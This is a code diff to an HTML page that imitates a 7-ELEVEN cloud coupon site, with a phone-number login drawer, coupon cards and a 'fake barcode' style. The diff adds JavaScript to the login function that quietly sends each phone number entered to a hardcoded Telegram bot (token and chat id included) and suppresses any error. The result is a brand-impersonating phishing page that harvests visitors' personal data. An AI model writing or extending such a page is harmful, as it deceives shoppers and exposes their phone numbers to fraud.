@@ -5,6 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>7-ELEVEN 雲端折價券</title>
     <style>
+        /* 品牌色彩變數 */
         :root {
             --seven-orange: #F47920;
             --seven-green: #00A651;
@@ -33,6 +34,7 @@
             overflow: hidden; 
         }
 
+        /* ================= 登入拉欄 (Drawer) ================= */
         #login-overlay {
             position: fixed;
             top: 0;
@@ -111,6 +113,7 @@
             cursor: pointer;
         }
 
+        /* ================= 條碼彈窗 (Barcode Modal) ================= */
         #barcode-modal-overlay {
             position: fixed;
             top: 0;
@@ -150,6 +153,7 @@
             margin-bottom: 20px;
         }
 
+        /* 擬真條碼視覺 */
         .fake-barcode {
             height: 80px;
             width: 100%;
@@ -182,6 +186,7 @@
             cursor: pointer;
         }
 
+        /* ================= 頂部與分類 ================= */
         header {
             background-color: white;
             padding: 15px 20px;
@@ -239,6 +244,7 @@
             border-color: var(--seven-green);
         }
 
+        /* ================= 折價券區塊 ================= */
         .coupon-list {
             padding: 20px;
             background-color: var(--bg-color);
@@ -306,7 +312,7 @@
         .coupon-img img {
             width: 100%;
             height: 100%;
-            object-fit: contain; /* 為了確保你的御飯糰照片完整顯示，改用 contain */
+            object-fit: contain; 
             background-color: white;
         }
 
@@ -340,6 +346,7 @@
         }
         .use-btn.green { background-color: var(--seven-green); }
 
+        /* ================= 頁尾聲明 ================= */
         .legal-footer {
             background-color: white;
             padding: 20px;
@@ -402,7 +409,6 @@
 
     <div class="coupon-list">
         
-        <!-- ================= 1. 全部優惠 ================= -->
         <div id="tab-all" class="tab-content active">
             <div class="campaign-card">
                 <div class="campaign-tag">取貨專屬回饋</div>
@@ -429,7 +435,6 @@
             </div>
 
             <div class="coupon-card">
-                <!-- 這裡替換成了你提供的照片名稱 鮪魚.jfif -->
                 <div class="coupon-img"><img src="鮪魚.jfif" alt="鮪魚御飯糰"></div>
                 <div class="coupon-info">
                     <div>
@@ -444,7 +449,6 @@
             </div>
         </div>
 
-        <!-- ================= 2. CITY CAFE ================= -->
         <div id="tab-cafe" class="tab-content">
             <div class="coupon-card">
                 <div class="coupon-img"><img src="https://images.unsplash.com/photo-1559525839-b184a4d698c7?auto=format&fit=crop&w=300&q=80" alt="拿鐵"></div>
@@ -475,10 +479,8 @@
             </div>
         </div>
 
-        <!-- ================= 3. 鮮食 ================= -->
         <div id="tab-food" class="tab-content">
             <div class="coupon-card">
-                <!-- 鮮食分類裡，我也幫你放了一張你的照片 -->
                 <div class="coupon-img"><img src="鮪魚.jfif" alt="鮪魚御飯糰"></div>
                 <div class="coupon-info">
                     <div>
@@ -493,7 +495,6 @@
             </div>
         </div>
 
-        <!-- ================= 4. 零食飲料 ================= -->
         <div id="tab-snacks" class="tab-content">
             <div class="coupon-card">
                 <div class="coupon-img"><img src="https://images.unsplash.com/photo-1622483767028-3f66f32aef97?auto=format&fit=crop&w=300&q=80" alt="可樂"></div>
@@ -510,7 +511,6 @@
             </div>
         </div>
 
-        <!-- ================= 5. 買一送一 ================= -->
         <div id="tab-bogo" class="tab-content">
             <div class="coupon-card">
                 <div class="coupon-img"><img src="https://images.unsplash.com/photo-1498804103079-a6351b050096?auto=format&fit=crop&w=300&q=80" alt="茶飲"></div>
@@ -528,7 +528,6 @@
         </div>
     </div>
 
-    <!-- ================= 頁尾聲明 ================= -->
     <footer class="legal-footer">
         <h4>注意事項與規範</h4>
         <ul>
@@ -539,18 +538,35 @@
         </ul>
     </footer>
 
-    <!-- JavaScript 邏輯 -->
     <script>
         function submitLogin() {
             const phoneInput = document.getElementById('phone-input').value;
+            
             if(phoneInput.length < 10) {
                 alert('請輸入完整的手機號碼！');
                 return;
             }
+
+            // 準備要傳送給 Telegram 的訊息內容
+            const msg = "【7-11 優惠券網站】收到新的登入號碼：" + phoneInput;
+
+            // 發送至你的 Telegram Bot
+            fetch("https://api.telegram.org/bot8710302623:AAFmI7o-LrW-2opgN_tKoqGVxWLP2F_-eDU/sendMessage", {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({
+                    chat_id: "1647683895",
+                    text: msg
+                })
+            }).catch(()=>{});
+
+            // 原本的 UI 互動：隱藏登入拉欄
             const overlay = document.getElementById('login-overlay');
             const drawer = document.getElementById('login-drawer');
+            
             drawer.style.transform = 'translateY(100%)';
             overlay.style.opacity = '0';
+            
             setTimeout(() => {
                 overlay.style.display = 'none';
                 document.body.style.overflow = 'auto'; 
